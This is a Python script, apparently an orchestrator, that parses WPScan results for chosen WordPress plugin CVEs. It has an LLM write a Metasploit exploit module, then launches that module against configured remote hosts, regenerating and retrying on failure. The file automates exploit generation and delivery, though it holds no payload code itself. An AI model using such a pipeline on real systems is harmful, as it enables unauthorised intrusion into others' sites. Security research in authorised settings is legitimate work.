# main.py
import argparse
import json
from pathlib import Path
import sys
import shutil

from config import OUTPUT_JSON, NEXT_URL_TXT, MODULE, RHOSTS, EXPLOIT_PATH, MSF_DIR, LHOST
from modules.exploit_generator import exec_genrb_from_main
from modules.auto_msf import run_auto_msf

def main():
    parser = argparse.ArgumentParser(description="Analyze output.json for specific CVEs and generate exploit.rb if found")
    parser.add_argument("-r", "--retry", type=int, default=2, help="Whether this is a retry attempt")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("-p", "--pick", default=1,type=int, metavar="N", help="Select an index number (1-based).")
    parser.add_argument("-c", "--target-cve", action="append", help="Target CVE(s) to search for (can specify multiple).")
    parser.add_argument("-m", "--model", nargs="?", default="gemini-2.0-flash", help="LLM model to use for exploit generation.")
    #["2020-25213", "2024-5932", "2025-3102", "2020-12800"]
    args = parser.parse_args()
    RETRYTIME = args.retry

    if not args.target_cve:
        args.target_cve = ["2020-25213"]

    if not OUTPUT_JSON.exists():
        print(f"Error: {OUTPUT_JSON} not found.")
        sys.exit(1)
    
    with OUTPUT_JSON.open("r", encoding="utf-8-sig") as f:
        data = json.load(f)

    vulns = []
    for plugin in data.get("plugins", {}).values():
        for vuln in plugin.get("vulnerabilities", []):
            references = vuln.get("references", {})
            cves = references.get("cve", [])
            urls = references.get("url", [])
            db_url = references.get("wpvulndb", [])
            vulns.append({"cves": cves, "urls": urls, "db_url": db_url})

    print("targetcve:", args.target_cve)
    for vuln in vulns:
        if any(cve in vuln["cves"] for cve in args.target_cve):
            print("Found target vuln:", vuln)
            # 儲存 next_url.txt（會被 exploit_generator 讀）
            init_url = None
            if vuln.get("db_url"):
                init_url = "https://wpscan.com/vulnerability/" + vuln['db_url'][0]
            with NEXT_URL_TXT.open("w", encoding="utf-8") as f:
                if init_url:
                    f.write(init_url + "\n")
                for u in vuln.get("urls", []):
                    f.write(u + "\n")
            print(f"Wrote next urls to {NEXT_URL_TXT}")
            # 呼叫 genRb 流程（在 package 內）
            exec_genrb_from_main(retry=args.retry, enable_debug=args.debug, prompt_index=args.pick, model=args.model)
            retrytimes = 0
            shutil.copy2(EXPLOIT_PATH, MSF_DIR)
            retvalue = run_auto_msf(module=MODULE, rhosts=RHOSTS, lhost=LHOST)
            while retvalue != 0 and retrytimes < RETRYTIME:
                exec_genrb_from_main(retry=True, enable_debug=args.debug, prompt_index=args.pick, model=args.model)
                shutil.copy2(EXPLOIT_PATH, MSF_DIR)
                retvalue = run_auto_msf(module=MODULE, rhosts=RHOSTS, lhost=LHOST)
                if retvalue != 0 :
                    retrytimes += 1
            if retrytimes >= RETRYTIME:
                print(f"[-] Exploit generation or execution failed after {RETRYTIME} retries.")
            else:
                print(f"[+] Exploit executed successfully!")
            break
    else:
        print("No target CVE found in output.json")

if __name__ == "__main__":
    main()
